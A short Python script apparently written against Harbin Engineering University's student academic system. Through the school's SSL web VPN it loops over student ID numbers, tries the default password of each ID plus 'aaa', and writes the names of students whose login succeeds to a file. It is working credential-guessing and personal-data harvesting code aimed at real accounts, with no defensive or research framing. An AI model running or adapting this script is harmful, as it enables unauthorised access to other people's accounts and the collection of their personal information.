# encoding = utf-8

import base64, re
from outnetUtil import OutNetLink

# https://ssl.hrbeu.edu.cn/web/1/http/1/edusys.hrbeu.edu.cn/jsxsd/index.jsp 外网正常登录
# 2015201514 is ok

fo = open("getlist_by_outweb.txt", "w+", encoding='utf-8')
# 对utf-8文件要用utf-8编码打开。。
cnt = 0

def getList():
    global cnt, fo
    for i in range(2015201514, 2015201515):
        s = OutNetLink.getConn()
        url = 'https://ssl.hrbeu.edu.cn/web/1/http/1/edusys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
        zh = str(i).encode(encoding="utf-8")
        psw = str(str(i) + 'aaa').encode(encoding="utf-8")
        arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
        arg = arg.decode()
        data = {
            'encoded': arg
        }
        cur = s.post(url=url, data=data)
        #print(cur.text)

        fi = re.search(u'用户名或密码错误', cur.text)
        # print(fi)

        if fi is None:
            name = re.search(u'姓名：(.*)<br/>', cur.text)
            cnt = cnt + 1
            cur = zh.decode() + '  ' + name.group(1) + '\n'
            fo.write(cur)
    fo.close()
    print(cnt)

if __name__ == '__main__':
    getList()
    fo.close()
